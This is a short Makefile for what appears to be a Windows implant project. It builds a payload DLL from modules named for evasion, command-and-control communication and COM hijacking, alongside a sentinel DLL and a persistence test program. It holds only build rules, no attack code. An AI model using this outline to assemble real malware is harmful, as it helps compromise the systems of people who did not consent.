CC = gcc
CXX = g++
CFLAGS = -Wall -Wextra -O2 -fPIC
CXXFLAGS = -Wall -Wextra -O2 -fPIC
LDFLAGS = -shared -ladvapi32 -lws2_32

all: payload.dll sentinel.dll test_persistence.exe

payload.dll: payload.o evasion.o c2_communication_fixed.o main.o com_hijack.o
	$(CC) $(LDFLAGS) -o $@ $^

sentinel.dll: sentinel_dll.o
	$(CXX) $(LDFLAGS) -o $@ $^

test_persistence.exe: test_persistence.o
	$(CC) -o $@ $^ -luser32 -lshell32 -lcomctl32 -lcomdlg32 -ladvapi32 -lkernel32 -luser32 -lgdi32 -lwinspool -lcomdlg32 -ladvapi32 -lshell32 -lole32 -loleaut32 -luuid -lodbc32 -lodbccp32

payload.o: payload.c payload.h payload_config.h
	$(CC) $(CFLAGS) -c -o $@ $<

evasion.o: evasion.c evasion.h
	$(CC) $(CFLAGS) -c -o $@ $<

c2_communication_fixed.o: c2_communication_fixed.c c2_communication_fixed.h config.h
	$(CC) $(CFLAGS) -c -o $@ $<

com_hijack.o: com_hijack.c com_hijack.h com_hijack_config.h
	$(CC) $(CFLAGS) -c -o $@ $<

main.o: main.c payload.h evasion.h c2_communication_fixed.h com_hijack.h com_hijack_config.h
	$(CC) $(CFLAGS) -c -o $@ $<

sentinel_dll.o: sentinel_dll.cpp sentinel_dll.h
	$(CXX) $(CXXFLAGS) -c -o $@ $<

test_persistence.o: test_persistence.c
	$(CC) $(CFLAGS) -c -o $@ $<

clean:
	rm -f *.o payload.dll sentinel.dll test_persistence.exe